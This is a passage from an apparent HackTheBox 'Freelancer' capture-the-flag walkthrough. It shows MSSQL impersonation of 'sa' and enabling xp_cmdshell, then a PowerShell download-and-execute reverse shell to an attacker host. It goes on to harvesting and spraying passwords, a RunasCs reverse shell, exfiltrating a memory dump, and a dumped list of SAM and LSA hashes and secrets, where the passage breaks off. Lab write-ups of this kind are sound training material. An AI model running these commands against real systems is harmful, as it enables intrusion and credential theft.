<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> user_name(); <span class="operator">/</span><span class="operator">/</span><span class="keyword">to</span> determine the <span class="keyword">user</span> name <span class="keyword">to</span> <span class="keyword">add</span> the role <span class="keyword">to</span> which <span class="keyword">is</span> Freelancer_webapp_user</span><br><span class="line"><span class="keyword">EXECUTE</span> <span class="keyword">AS</span> LOGIN <span class="operator">=</span> <span class="string">&#x27;sa&#x27;</span></span><br><span class="line"><span class="keyword">SELECT</span> IS_SRVROLEMEMBER(<span class="string">&#x27;sysadmin&#x27;</span>)</span><br><span class="line"><span class="keyword">EXECUTE</span> <span class="keyword">AS</span> LOGIN <span class="operator">=</span> <span class="string">&#x27;sa&#x27;</span></span><br><span class="line"><span class="keyword">EXEC</span> sp_addsrvrolemember <span class="string">&#x27;Freelancer_webapp_user&#x27;</span>, <span class="string">&#x27;sysadmin&#x27;</span></span><br><span class="line"><span class="keyword">SELECT</span> IS_SRVROLEMEMBER(<span class="string">&#x27;sysadmin&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="string">&#x27;1&#x27;</span>;RECONFIGURE;<span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>, <span class="string">&#x27;1&#x27;</span> ;RECONFIGURE</span><br><span class="line"></span><br><span class="line"><span class="keyword">EXEC</span> xp_cmdshell <span class="string">&#x27;whoami&#x27;</span>;</span><br></pre></td></tr></table></figure></div>

<p>And now we can execute commands as we please:<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/Freelancer/mssq4.png"
                      alt="MSSQL Abuse"
                ><figcaption>MSSQL Abuse</figcaption></figure></p>
<p>Let’s get a shell then :D</p>
<h3 id="Shell-as-freelancer-sql-svc"><a href="#Shell-as-freelancer-sql-svc" class="headerlink" title="Shell as freelancer\sql_svc"></a>Shell as freelancer\sql_svc</h3><p>We execute our reverse shell command:</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> xp_cmdshell <span class="string">&#x27;powershell -c iex(iwr 10.10.x.x/r.ps1 -usebasicparsing);&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>And we are in:</p>
<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt; nc <span class="literal">-lvnp</span> <span class="number">9001</span></span><br><span class="line">listening on [<span class="type">any</span>] <span class="number">9001</span> ...</span><br><span class="line">connect to <span class="function">[<span class="number">10.10</span><span class="type">.x.x</span>] <span class="title">from</span></span> (UNKNOWN) [<span class="number">10.129</span><span class="type">.160.22</span>] <span class="number">55468</span></span><br><span class="line">Windows PowerShell running as user sql_svc on DC</span><br><span class="line">Copyright (C) <span class="number">2015</span> Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\WINDOWS\system32&gt;whoami</span><br><span class="line">freelancer\sql_svc</span><br><span class="line"><span class="built_in">PS</span> C:\WINDOWS\system32&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>As usual, I’ll be looking for hidden database credentials. Looking at the MSSQL server configurations, I stumbled upon <code>sql-Configuration.INI</code> file with a password:</p>
<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\users\sql_svc\downloads\SQLEXPR<span class="literal">-2019_x64_ENU</span>&gt; <span class="built_in">cat</span> sql<span class="literal">-Configuration</span>.INI</span><br><span class="line">[<span class="type">OPTIONS</span>]</span><br><span class="line">ACTION=<span class="string">&quot;Install&quot;</span></span><br><span class="line">QUIET=<span class="string">&quot;True&quot;</span></span><br><span class="line">FEATURES=SQL</span><br><span class="line">INSTANCENAME=<span class="string">&quot;SQLEXPRESS&quot;</span></span><br><span class="line">INSTANCEID=<span class="string">&quot;SQLEXPRESS&quot;</span></span><br><span class="line">RSSVCACCOUNT=<span class="string">&quot;NT Service\ReportServer<span class="variable">$SQLEXPRESS</span>&quot;</span></span><br><span class="line">AGTSVCACCOUNT=<span class="string">&quot;NT AUTHORITY\NETWORK SERVICE&quot;</span></span><br><span class="line">AGTSVCSTARTUPTYPE=<span class="string">&quot;Manual&quot;</span></span><br><span class="line">COMMFABRICPORT=<span class="string">&quot;0&quot;</span></span><br><span class="line">COMMFABRICNETWORKLEVEL=<span class="string">&quot;&quot;</span><span class="number">0</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">COMMFABRICENCRYPTION=&quot;</span><span class="number">0</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">MATRIXCMBRICKCOMMPORT=&quot;</span><span class="number">0</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">SQLSVCSTARTUPTYPE=&quot;</span>Automatic<span class="string">&quot;</span></span><br><span class="line"><span class="string">FILESTREAMLEVEL=&quot;</span><span class="number">0</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">ENABLERANU=&quot;</span>False<span class="string">&quot; </span></span><br><span class="line"><span class="string">SQLCOLLATION=&quot;</span>SQL_Latin1_General_CP1_CI_AS<span class="string">&quot;</span></span><br><span class="line"><span class="string">SQLSVCACCOUNT=&quot;</span>FREELANCER\sql_svc<span class="string">&quot;</span></span><br><span class="line"><span class="string">SQLSVCPASSWORD=&quot;</span>IL0v3ErenY3ager<span class="string">&quot;</span></span><br><span class="line"><span class="string">SQLSYSADMINACCOUNTS=&quot;</span>FREELANCER\Administrator<span class="string">&quot;</span></span><br><span class="line"><span class="string">SECURITYMODE=&quot;</span>SQL<span class="string">&quot;</span></span><br><span class="line"><span class="string">SAPWD=&quot;</span>t3mp0<span class="built_in">r</span>@ryS@<span class="built_in">PWD</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">ADDCURRENTUSERASSQLADMIN=&quot;</span>False<span class="string">&quot;</span></span><br><span class="line"><span class="string">TCPENABLED=&quot;</span><span class="number">1</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">NPENABLED=&quot;</span><span class="number">1</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">BROWSERSVCSTARTUPTYPE=&quot;</span>Automatic<span class="string">&quot;</span></span><br><span class="line"><span class="string">IAcceptSQLServerLicenseTerms=True</span></span><br><span class="line"><span class="string">PS C:\users\sql_svc\downloads\SQLEXPR-2019_x64_ENU&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>The password is: <code>IL0v3ErenY3ager</code><br>I’ll check the <code>C:/users</code> folder to get usernames for enumeration:</p>
<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\users&gt; <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\users</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line"><span class="literal">----</span>                <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span></span><br><span class="line">d<span class="literal">-----</span>        <span class="number">10</span>/<span class="number">4</span>/<span class="number">2024</span>  <span class="number">10</span>:<span class="number">57</span> PM                Administrator</span><br><span class="line">d<span class="literal">-----</span>        <span class="number">5</span>/<span class="number">28</span>/<span class="number">2024</span>  <span class="number">10</span>:<span class="number">23</span> AM                lkazanof</span><br><span class="line">d<span class="literal">-----</span>        <span class="number">5</span>/<span class="number">28</span>/<span class="number">2024</span>  <span class="number">10</span>:<span class="number">23</span> AM                lorra199</span><br><span class="line">d<span class="literal">-----</span>        <span class="number">5</span>/<span class="number">28</span>/<span class="number">2024</span>  <span class="number">10</span>:<span class="number">22</span> AM                mikasaAckerman</span><br><span class="line">d<span class="literal">-----</span>        <span class="number">8</span>/<span class="number">27</span>/<span class="number">2023</span>   <span class="number">1</span>:<span class="number">16</span> AM                MSSQLSERVER</span><br><span class="line">d<span class="literal">-r---</span>        <span class="number">5</span>/<span class="number">28</span>/<span class="number">2024</span>   <span class="number">2</span>:<span class="number">13</span> PM                Public</span><br><span class="line">d<span class="literal">-----</span>        <span class="number">5</span>/<span class="number">28</span>/<span class="number">2024</span>  <span class="number">10</span>:<span class="number">22</span> AM                sqlbackupoperator</span><br><span class="line">d<span class="literal">-----</span>        <span class="number">5</span>/<span class="number">28</span>/<span class="number">2024</span>  <span class="number">11</span>:<span class="number">16</span> AM                sql_svc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\users&gt;</span><br></pre></td></tr></table></figure></div>

<p>Running the usernames and password against <code>crackmapexec</code> I find a valid match for <code>mikasaAckerman</code> user:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/hackthebox/freelancer]</span><br><span class="line">└─$ crackmapexec smb freelancer.htb -u users.txt -p IL0v3ErenY3ager --continue-on-success</span><br><span class="line">SMB         10.129.9.24     445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.129.9.24     445    DC               [+] freelancer.htb\mikasaAckerman:IL0v3ErenY3ager </span><br><span class="line">SMB         10.129.9.24     445    DC               [-] freelancer.htb\lorra199:IL0v3ErenY3ager STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.129.9.24     445    DC               [-] freelancer.htb\lkazanof:IL0v3ErenY3ager STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.129.9.24     445    DC               [-] freelancer.htb\Administrator:IL0v3ErenY3ager STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.129.9.24     445    DC               [-] freelancer.htb\:IL0v3ErenY3ager STATUS_LOGON_FAILURE </span><br></pre></td></tr></table></figure></div>


<p>I can get a shell as this user using <code>RunasCs</code> to perform actions by impersonating him. Therefore gaining a shell:</p>
<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\users\sql_svc\downloads&gt; <span class="built_in">iwr</span> <span class="number">10.10</span>.x.x/RunasCs.exe <span class="literal">-outfile</span> run.exe</span><br><span class="line"><span class="built_in">PS</span> C:\users\sql_svc\downloads&gt; ./run.exe mikasaAckerman IL0v3ErenY3ager powershell.exe <span class="literal">-r</span> <span class="number">10.10</span>.x.x:<span class="number">9001</span></span><br><span class="line"></span><br><span class="line">[+] Running <span class="keyword">in</span> session <span class="number">0</span> with <span class="keyword">process</span> <span class="function"><span class="keyword">function</span> <span class="title">CreateProcessWithLogonW</span><span class="params">()</span></span></span><br><span class="line">[+] <span class="keyword">Using</span> Station\Desktop: Service-0x0-3ea25$\Default</span><br><span class="line">[+] Async <span class="keyword">process</span> <span class="string">&#x27;C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe&#x27;</span> with pid <span class="number">4880</span> created <span class="keyword">in</span> background.</span><br><span class="line"><span class="built_in">PS</span> C:\users\sql_svc\downloads&gt;</span><br></pre></td></tr></table></figure></div>

<p>And we get our shell:</p>
<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt; nc <span class="literal">-lvnp</span> <span class="number">9001</span></span><br><span class="line">listening on [<span class="type">any</span>] <span class="number">9001</span> ...</span><br><span class="line">connect to <span class="function">[<span class="number">10.10</span><span class="type">.x.x</span>] <span class="title">from</span></span> (UNKNOWN) [<span class="number">10.129</span><span class="type">.160.22</span>] <span class="number">61400</span></span><br><span class="line">Windows PowerShell</span><br><span class="line">Copyright (C) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\WINDOWS\system32&gt; whoami</span><br><span class="line">whoami</span><br><span class="line">freelancer\mikasaackerman</span><br><span class="line"><span class="built_in">PS</span> C:\WINDOWS\system32&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>And we get our user flag:</p>
<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\users\mikasaackerman\desktop&gt; <span class="built_in">cat</span> user.txt</span><br><span class="line"><span class="built_in">cat</span> user.txt</span><br><span class="line"><span class="number">55360</span>f18f618fe******************</span><br><span class="line"><span class="built_in">PS</span> C:\users\mikasaackerman\desktop</span><br></pre></td></tr></table></figure></div>

<h3 id="Privilege-Escalation-to-Administrator"><a href="#Privilege-Escalation-to-Administrator" class="headerlink" title="Privilege Escalation to Administrator"></a>Privilege Escalation to Administrator</h3><p>On <code>mikasaAckerman</code>‘s desktop, we could also see two interesting files, one of which is <code>mail.txt</code>:</p>
<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\users\mikasaackerman\desktop&gt; <span class="built_in">cat</span> mail.txt</span><br><span class="line"><span class="built_in">cat</span> mail.txt</span><br><span class="line">Hello Mikasa,</span><br><span class="line">I tried once again to work with Liza Kazanoff after seeking her help to troubleshoot the BSOD issue on the <span class="string">&quot;DATACENTER-2019&quot;</span> computer. As you know, the problem started occurring after we installed the new update of SQL Server <span class="number">2019</span>.</span><br><span class="line">I attempted the solutions you provided <span class="keyword">in</span> your last email, but unfortunately, there was no improvement. Whenever we <span class="keyword">try</span> to establish a remote SQL connection to the installed instance, the server<span class="string">&#x27;s CPU starts overheating, and the RAM usage keeps increasing until the BSOD appears, forcing the server to restart.</span></span><br><span class="line"><span class="string">Nevertheless, Liza has requested me to generate a full memory dump on the Datacenter and send it to you for further assistance in troubleshooting the issue.</span></span><br><span class="line"><span class="string">Best regards,</span></span><br><span class="line"><span class="string">PS C:\users\mikasaackerman\desktop&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>Reading the mail file, we can conclude that the <code>MEMORY.7z</code> file is a Datacenter memory dump file. I will transfer the file over to my station and have a look at it.<br>For this I will be using this script to make it a base64 file and then transfer it over to my machine:</p>
<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$inputFile</span> = <span class="string">&quot;C:\users\mikasaackerman\desktop\MEMORY.7z&quot;</span></span><br><span class="line"><span class="variable">$outputFile</span> = <span class="string">&quot;C:\users\mikasaackerman\desktop\mem.b64&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$inputStream</span> = [<span class="type">System.IO.File</span>]::OpenRead(<span class="variable">$inputFile</span>)</span><br><span class="line"><span class="variable">$outputStream</span> = [<span class="type">System.IO.StreamWriter</span>]::new(<span class="variable">$outputFile</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$chunkSize</span> = <span class="number">64</span>KB</span><br><span class="line">    <span class="variable">$buffer</span> = <span class="built_in">New-Object</span> byte[] <span class="variable">$chunkSize</span></span><br><span class="line">    <span class="keyword">while</span> ((<span class="variable">$bytesRead</span> = <span class="variable">$inputStream</span>.Read(<span class="variable">$buffer</span>, <span class="number">0</span>, <span class="variable">$buffer</span>.Length)) <span class="operator">-gt</span> <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="variable">$encodedChunk</span> = [<span class="type">Convert</span>]::ToBase64String(<span class="variable">$buffer</span>, <span class="number">0</span>, <span class="variable">$bytesRead</span>)</span><br><span class="line">        <span class="variable">$outputStream</span>.WriteLine(<span class="variable">$encodedChunk</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="variable">$inputStream</span>.Close()</span><br><span class="line">    <span class="variable">$outputStream</span>.Close()</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">&quot;Base64 encoding completed.&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>Then I cleaned it and transferred it again to the <code>7z</code> format:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grep -o <span class="string">&#x27;[A-Za-z0-9+/=]&#x27;</span> mem.b64 | <span class="built_in">tr</span> -d <span class="string">&#x27;\n&#x27;</span> &gt; cleaned_mem.b64 </span><br><span class="line"><span class="built_in">base64</span> -d cleaned_mem.b64  &gt; memory.7z</span><br></pre></td></tr></table></figure></div>

<p>As the MEMORY.7z file is a datacenter memory dump, at first I thought of using <code>Volatility</code> to analyze it (as I love that tool). But after some more research I stumbled onto <a class="link"   target="_blank" rel="noopener" href="https://github.com/ufrisk/MemProcFS" >MemProcFS <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> tool which will allow me to view the dump on a virtual system.<br><code>MemProcFS</code> has many features and plugins, one of which is <code>mimikatz</code> which gave me the sam hive including <code>lorra</code> user’s password:</p>
<div class="highlight-container" data-rel="Txt"><figure class="iseeu highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">PS M:\py\regsecrets&gt; cat .\sam.txt</span><br><span class="line">============== SAM hive secrets ==============</span><br><span class="line">HBoot Key: ea5f053efa118386e50003fe8d99078310101010101010101010101010101010</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:725180474a181356e53f4fe3dffac527:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:04fc56dd3ee3165e966ed04ea791d7a7:::</span><br><span class="line">PS M:\py\regsecrets&gt; cat .\all.txt</span><br><span class="line">============== SAM hive secrets ==============</span><br><span class="line">HBoot Key: ea5f053efa118386e50003fe8d99078310101010101010101010101010101010</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:725180474a181356e53f4fe3dffac527:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:04fc56dd3ee3165e966ed04ea791d7a7:::</span><br><span class="line">============== SECURITY hive secrets ==============</span><br><span class="line">Iteration count: 10240</span><br><span class="line">Secrets structure format : VISTA</span><br><span class="line">LSA Key: c6a7057cad4f93923c45b26cbaaa5550ce747620c8ef8772e53dccb70f55889e</span><br><span class="line">NK$LM Key: 40000000000000000000000000000000634d9d4c85ef33ffa5e14de2dca12075d220eaa9bce0db7dbe77e9be6ead47ec2602e1f6bff5c5ccf9d67a16491c43c5776de0a8c6241536bf27499619b96320fe8905909f598175c930e9b170818d39</span><br><span class="line">FREELANCER.HTB/Administrator:*2023-10-04 12:55:34*$DCC2$10240#Administrator#67a0c0f193abd932b55fb8916692c361</span><br><span class="line">FREELANCER.HTB/lorra199:*2023-10-04 12:29:00*$DCC2$10240#lorra199#7ce808b78e75a5747135cf53dc6ac3b1</span><br><span class="line">FREELANCER.HTB/liza.kazanof:*2023-10-04 17:31:23*$DCC2$10240#liza.kazanof#ecd6e532224ccad2abcf2369ccb8b679</span><br><span class="line">=== LSA Machine account password ===</span><br><span class="line">History: False</span><br><span class="line">NT: 1003ddfa0a470017188b719e1eaae709</span><br><span class="line">Password(hex): a680a4af30e045066419c6f52c073d738241fa9d1cff591b951535cff5320b109e65220c1c9e4fa891c9d1ee22e990c4766b3eb63fb3e2da67ebd19830d45c0ba4e6e6df93180c0a7449750655edd78eb848f757689a6889f3f8f7f6cf53e1196a528a7cd105a2eccefb2a17ae5aebf84902e3266bbc5db6e371627bb0828c2a364cb01119cf3d2c70d920328c814cad07f2b516143d86d0e88ef1504067815ed70e9ccb861f57394d94ba9f77198e9d76ecadf8cdb1afda48b81f81d84ac62530389cb64d412b784f0f733551a62ec0862ac2fb261b43d79990d4e2bfbf4d7d4eeb90ccd7dc9b482028c2143c5a6010</span><br><span class="line">Kerberos password(hex): e882a6eabea4ee80b0d985e1a5a4ef9786dcace78cbde48682e9b7baefbc9ce1ad99e19695ecbcb5e38bb5e1808be6969ee0b0a2e9b89ceaa18feca691eebb91eea4a2ec9290e6adb6eb98beeb8cbfefbfbdeeada7e9a391ed90b0e0ad9cee9aa4efbfbde1a293e0a88ce4a5b4d9b5eeb595e8bb97e4a2b8e59fb7e9a9a8e8a5a8efa3b3ef9bb7e58f8fe1a7a1e589aae7b28ad791eeb2a2efaf8ee19caae5aaaeefa3abc989e29ba3ebb1abeb999de787a3e7ada2e88ab0e2aa8ce4b0b6e186b0ecbc99e2b0bdefbfbde388a0e8868ceab58cef8887e19ab5e3b494ed8286e8bba8e583b1e69d80e5ba81e0bb97ecae9ce1be86e3a597e9918de9bebae1a5b7e9b68eeeb1b6efa2adeb878defbfbdeba188e8849fe4ab98e29786e3a0b0eb9a9ce4858de7a0abe0bd8fe395b3ea9991ec80aee2aa86efaf82e1aca6ed9d83e98299ee8b94ebbebfe7b58deead8eecb290efbfbde4a29be2a0a0e19382e5a8bce181a0</span><br><span class="line">=== LSA Machine account password ===</span><br><span class="line">History: True</span><br><span class="line">NT: 4e7857719aec1e3f13e79f28f68bb95d</span><br><span class="line">Password(hex): 3300740032004300770065003b0038004b00780021003a0062002c0072003d0034002300280024007a002a006a006900450049005000220031003000600063002d0049002500680060004000280029002300560077004f0027006e005d0042006c007300510043003a00230055005100410048004b006e003b0024003900430030004000200047007400420049003300430048005f0036006200740024003b002000750052002500530067006500420066004d004d00600076005a0030004000740038005b003300460067004400620058006f0051005e004c0036005a00370072004200780038003900200078003a00</span><br><span class="line">Kerberos password(hex): 3374324377653b384b78213a622c723d342328247a2a6a6945495022313060632d492568604028292356774f276e5d426c7351433a23555141484b6e3b243943304020477442493343485f366274243b2075522553676542664d4d60765a304074385b3346674462586f515e4c365a37724278383920783a</span><br><span class="line">=== LSA DPAPI secret ===</span><br><span class="line">History: False</span><br><span class="line">Machine key (hex): cf1bc407d272ade7e781f17f6f3a3fc2b82d16bc</span><br><span class="line">User key(hex): 6d210ab98889fac8829a1526a5d6a2f76f8f9d53</span><br><span class="line">=== LSA DPAPI secret ===</span><br><span class="line">History: True</span><br><span class="line">Machine key (hex): ee8c9b3c041dc01afb54b421d4fafa0bbd314c1c</span><br><span class="line">User key(hex): a3a744a52e541603869eef3ee06191dd8597db83</span><br><span class="line">=== LSASecret NL$KM ===</span><br><span class="line"></span><br><span class="line">History: False</span><br><span class="line">Secret:</span><br><span class="line">00000000:  63 4d 9d 4c 85 ef 33 ff  a5 e1 4d e2 dc a1 20 75   |cM.L..3...M... u|</span><br><span class="line">00000010:  d2 20 ea a9 bc e0 db 7d  be 77 e9 be 6e ad 47 ec   |. .....&#125;.w..n.G.|</span><br><span class="line">00000020:  26 02 e1 f6 bf f5 c5 cc  f9 d6 7a 16 49 1c 43 c5   |&amp;.........z.I.C.|</span><br><span class="line">00000030:  77 6d e0 a8 c6 24 15 36  bf 27 49 96 19 b9 63 20   |wm...$.6.&#x27;I...c |</span><br><span class="line">=== LSASecret NL$KM ===</span><br><span class="line"></span><br><span class="line">History: True</span><br><span class="line">Secret:</span><br><span class="line">00000000:  63 4d 9d 4c 85 ef 33 ff  a5 e1 4d e2 dc a1 20 75   |cM.L..3...M... u|</span><br><span class="line">00000010:  d2 20 ea a9 bc e0 db 7d  be 77 e9 be 6e ad 47 ec   |. .....&#125;.w..n.G.|</span><br><span class="line">00000020:  26 02 e1 f6 bf f5 c5 cc  f9 d6 7a 16 49 1c 43 c5   |&amp;.........z.I.C.|</span><br><span class="line">00000030:  77 6d e0 a8 c6 24 15 36  bf 27 49 96 19 b9 63 20   |wm...$.6.&#x27;I...c |</span><br><span class="line">=== LSA Service User Secret ===</span><br><span class="line">History: False</span><br><span class="line">Service name: _SC_MSSQL$DATA</span><br><span class="line">Username: UNKNOWN</span><br><span class="line">00000000:  50 57 4e 33 44 23 6c 30  72 72 40 41 72 6d 65 73   |PWN3D#l0rr@Armes|</span><br><span class="line">00000010:  73 61 31 39 39                                     |sa199|</span><br><span class="line">=== LSA Service User Secret ===</span><br><span class="line">History: True</span><br><span class="line">Service name: _SC_MSSQL$DATA</span><br><span class="line">Username: UNKNOWN</span><br><span class="line">00000000:  4d 53 53 51 4c 53 33 72  76 33 72 50 40 73 73 77   |MSSQLS3rv3rP@ssw|</span><br><span class="line">00000010:  64 23 30 39                                     